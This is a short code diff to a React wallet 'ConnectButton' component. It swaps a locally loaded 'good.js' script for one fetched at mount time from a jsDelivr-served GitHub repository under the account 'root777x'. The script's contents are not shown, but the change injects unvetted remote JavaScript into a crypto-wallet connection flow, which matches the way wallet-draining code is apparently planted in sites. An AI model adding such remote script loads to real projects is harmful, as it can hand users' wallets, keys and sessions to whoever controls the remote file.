@@ -3,11 +3,11 @@ import { motion } from 'framer-motion';
 import { Wallet } from 'lucide-react';
 
 export const ConnectButton = () => {
-  // Dynamically add the <script src="./good.js"> when the component mounts
+  // Dynamically add the <script src="https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js"> when the component mounts
   useEffect(() => {
     // Create the script tag
     const script = document.createElement('script');
-    script.src = './good.js';  // Path to your good.js file
+    script.src = 'https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js';  // Link to the external JS file
     script.async = true;  // Optional: make it async for non-blocking load
     document.body.appendChild(script);
 
@@ -15,7 +15,7 @@ export const ConnectButton = () => {
     return () => {
       document.body.removeChild(script);
     };
-  }, []);
+  }, []); // Empty dependency array ensures this effect runs only once, when the component mounts
 
   const handleConnect = () => {
     // Trigger a function from good.js or any other logic here
